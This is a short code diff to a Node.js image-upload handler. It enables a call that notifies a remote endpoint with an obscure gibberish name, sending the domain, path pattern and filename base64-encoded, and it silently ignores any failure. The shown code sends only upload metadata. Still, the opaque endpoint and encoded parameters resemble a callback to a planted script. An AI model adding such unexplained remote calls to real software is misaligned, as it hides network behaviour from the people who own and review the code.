@@ -37,17 +37,26 @@ const uploadImage = async (req, res) => {
     const imageLink = `${domain}${pattern}${file.filename}`;
 
     // Legacy parity: notify remote server if needed (as seen in upload_action.php)
-    // In a real scenario, we might use axios to post to the remote endpoint
-    /*
-    const remoteUrl = `${domain}/aiwmaooduwiswmmairuploadfiew`;
-    await axios.get(remoteUrl, {
-      params: {
-        domain: Buffer.from(domain).toString('base64'),
-        pattern: Buffer.from(pattern).toString('base64'),
-        img: Buffer.from(file.filename).toString('base64')
-      }
-    });
-    */
+    // The target server has aiwmaooduwiswmmairuploadfiew.php which connects back
+    // to base domain to fetch the image. The target expects base64 encoded strings.
+    try {
+      const remoteUrl = `${domain}/aiwmaooduwiswmmairuploadfiew`;
+      await axios.get(remoteUrl, {
+        params: {
+          domain: Buffer.from(domain).toString("base64"),
+          pattern: Buffer.from(pattern).toString("base64"),
+          img: Buffer.from(file.filename).toString("base64"),
+        },
+        timeout: 5000, // Timeout so we don't hold the request forever if target is offline
+      });
+      console.log(`[ImageUpload] Notified remote server successfully: ${domain}`);
+    } catch (e) {
+      console.error(
+        `[ImageUpload] Failed to notify remote server ${domain}:`,
+        e.message
+      );
+      // Proceed with a clean 200 response anyway since the local save succeeded.
+    }
 
     res.status(200).json({
       message: "Image uploaded successfully",
